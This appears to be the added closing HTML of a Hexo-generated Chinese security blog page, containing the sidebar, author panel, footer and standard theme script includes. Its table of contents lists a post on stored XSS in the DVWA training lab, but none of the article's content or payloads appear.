+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/L-Lawliet.jpg"
+                alt="Lawliet" />
+            
+              <p class="site-author-name" itemprop="name">Lawliet</p>
+              <p class="site-description motion-element" itemprop="description">信息安全技术博客</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dvwa存储型xss"><span class="nav-number">1.</span> <span class="nav-text">dvwa存储型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#序"><span class="nav-number">1.0.1.</span> <span class="nav-text">序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#测试环境"><span class="nav-number">1.0.2.</span> <span class="nav-text">测试环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#low级别"><span class="nav-number">1.0.3.</span> <span class="nav-text">low级别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#medium级别"><span class="nav-number">1.0.4.</span> <span class="nav-text">medium级别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#high-级别"><span class="nav-number">1.0.5.</span> <span class="nav-text">high 级别</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Lawliet</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.3</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
